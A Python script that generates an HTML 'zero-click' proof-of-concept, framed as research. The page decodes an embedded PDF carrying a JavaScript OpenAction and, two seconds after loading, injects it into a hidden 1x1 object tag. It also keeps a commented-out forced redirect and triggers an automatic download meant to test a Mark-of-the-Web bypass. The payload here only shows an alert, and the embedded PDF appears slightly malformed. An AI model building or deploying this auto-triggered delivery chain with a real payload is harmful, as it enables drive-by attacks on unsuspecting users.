import base64

# Base64 encoded minimalist PDF that contains a safe JavaScript action
# This PDF simply displays an alert: "PDF Executed Safely"
# Generated via `mutool` or similar PDF tools for research.
SAFE_PDF_B64 = "JVBERi0xLjcKCjEgMCBvYmogICUgZW50cnkgcG9pbnQKPDwKICAvVHlwZSAvQ2F0YWxvZwogIC9QYWdlcyAyIDAgUgogIC9PcGVuQWN0aW9uIDw8CiAgICAvUyAvSmF2YVNjcmlwdAogICAgL0pTIChhcHAuYWxlcnQoJ1BERiBFeGVjdXRlZCAtIFNhZmUgUmVzZWFyY2gnKTspCiAgPj4KPj4KZW5kb2JqCgoyIDAgb2JqCjw8CiAgL1R5cGUgL1BhZ2VzCiAgL01lZGlhQm94IFsgMCAwIDIwMCAyMDAgXQogIC9Db3VudCAxCiAgL0tpZHMgWyAzIDAgUiBdCj4+CmVuZG9iagoKMyAwIG9iago8PAogIC9UeXBlIC9QYWdlCiAgL1BhcmVudCAyIDAgUgogIC9SZXNvdXJjZXMgPDwKICAgIC9Gb250IDw8CiAgICAgIC9GMSA0IDAgUHVibGljCiAgICA+PgogID4+CiAgL0NvbnRlbnRzIDUgMCBSCj4+CmVuZG9iagoKNCAwIG9iago8PAogIC9UeXBlIC9Gb250CiAgL1N1YnR5cGUgL1R5cGUxCiAgL0Jhc2VGb250IC9IZWx2ZXRpY2kKPj4KZW5kb2JqCgo1IDAgb2JqCjw8IC9MZW5ndGggNDQgPj4Kc3RyZWFtCkJUCjcwIDUwIFRECi9GMSAxMiBUZgwoSGVsbG8gV29ybGQhKSBUagpFVAplbmRzdHJlYW0KZW5kb2JqCgp4cmVmCjAgNgowMDAwMDAwMDAwIDY1NTM1IGYgCjAwMDAwMDAwMTAgMDAwMDAgbiAKMDAwMDAwMDExMyAwMDAwMCBuIAowMDAwMDAwMjAwIDAwMDAwIG4gCjAwMDAwMDAzMDMgMDAwMDAgbiAKMDAwMDAwMDM4OSAwMDAwMCBuIAp0cmFpbGVyCjw8CiAgL1NpemUgNgogIC9Sb290IDEgMCBSCj4+CnN0YXJ0eHJlZgo0ODQKJSVFT0YK"

def create_local_poc():
    print("[*] Generating Self-Contained PoC (No Domain Needed)...")

    # We use a standard string and .replace() to avoid f-string syntax errors with CSS/JS braces
    html_template = """
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <title>Local Research PoC</title>
        <style>
            body { font-family: monospace; background: #1a1a1a; color: #0f0; padding: 20px; }
            .log { border: 1px solid #333; padding: 10px; margin-top: 10px; background: #000; }
            button { padding: 10px 20px; background: #333; color: #fff; border: 1px solid #555; cursor: pointer; }
            button:hover { background: #444; }
        </style>
    </head>
    <body>
        <h1>[Research] Zero-Click Chain Demo</h1>
        <p>This page simulates the exploit chain locally using Blob manipulation.</p>
        <div id="status" class="log">Ready...</div>

        <br>
        <button id="triggerBtn">Manually Trigger (Simulate Interaction)</button>

        <script>
            const log = (msg) => {
                const statusDiv = document.getElementById('status');
                statusDiv.innerText += "\\n[+] " + msg;
                console.log(msg);
            };

            const base64ToBlob = (base64, mimeType) => {
                const byteCharacters = atob(base64);
                const byteNumbers = new Array(byteCharacters.length);
                for (let i = 0; i < byteCharacters.length; i++) {
                    byteNumbers[i] = byteCharacters.charCodeAt(i);
                }
                const byteArray = new Uint8Array(byteNumbers);
                return new Blob([byteArray], { type: mimeType });
            };

            const executeChain = () => {
                log("Stage 1: Constructing PDF payload in memory...");

                // Construct the PDF blob from our embedded Base64 string
                const pdfBlob = base64ToBlob("REPLACE_ME_PDF_B64", "application/pdf");

                // CRITICAL: We append '#FDF=' to the URL.
                // This is the "Adobe Open Parameters" trick.
                // It hints to the browser/plugin to treat this as an interactive PDF stream.
                const pdfUrl = URL.createObjectURL(pdfBlob) + "#FDF=safe_research";

                log("Stage 2: PDF Blob created at " + pdfUrl);

                // Technique A: Object/Embed Injection (Forced Inline Rendering)
                // We use an <object> tag instead of just an iframe.
                // This is more aggressive at forcing the browser to load the plugin.
                log("Attempting 'Auto-Open' via <object> Injection...");

                const obj = document.createElement('object');
                obj.data = pdfUrl;
                obj.type = "application/pdf";
                obj.width = "1";
                obj.height = "1";
                obj.style.visibility = "hidden";
                document.body.appendChild(obj);

                log("Stage 3: Object injected. Waiting for plugin execution...");

                // Technique B: Window Navigation (The "Direct Open" Vector)
                // If the object tag fails (e.g., built-in viewer blocks it),
                // we try to navigate the current window to the PDF blob.
                // This forces the browser to decide: "Render or Download?"
                setTimeout(() => {
                    log("Attempting fallback navigation (window.location)...");
                    // window.location.href = pdfUrl; // Uncomment to force navigation
                    log("Navigation skipped to keep page open. In a real attack, we would redirect.");
                }, 500);

                // Technique C: Fallback Download (for MotW evidence)
                // We also trigger the download so you have the file for the PowerShell check.
                setTimeout(() => {
                    log("Triggering fallback download for MotW verification...");
                    const link = document.createElement('a');
                    link.href = pdfUrl;
                    link.download = "research_payload.pdf";
                    document.body.appendChild(link);
                    link.click();
                    document.body.removeChild(link);
                }, 1000);
            };

            // Auto-trigger on load (The "Zero-Click" simulation)
            window.onload = () => {
                log("Page Loaded. Waiting 2 seconds before auto-trigger...");
                setTimeout(executeChain, 2000);
            };

            document.getElementById('triggerBtn').onclick = executeChain;
        </script>
    </body>
    </html>
    """

    # Inject the Base64 PDF content safely
    html_content = html_template.replace("REPLACE_ME_PDF_B64", SAFE_PDF_B64)

    with open("local_poc.html", "w") as f:
        f.write(html_content)

    print("[+] Created 'local_poc.html'.")
    print("[*] INSTRUCTIONS:")
    print("1. Open 'local_poc.html' in Chrome directly (double-click).")
    print("2. The script will auto-trigger the 'Auto-Open' attempt.")
    print("   -> If successful, you will see a POP-UP ALERT: 'PDF Executed Safely'.")
    print("3. It will ALSO download 'research_payload.pdf'.")
    print("   -> Use 'Check-MotW.ps1' on this file to prove the security bypass.")

if __name__ == "__main__":
    create_local_poc()
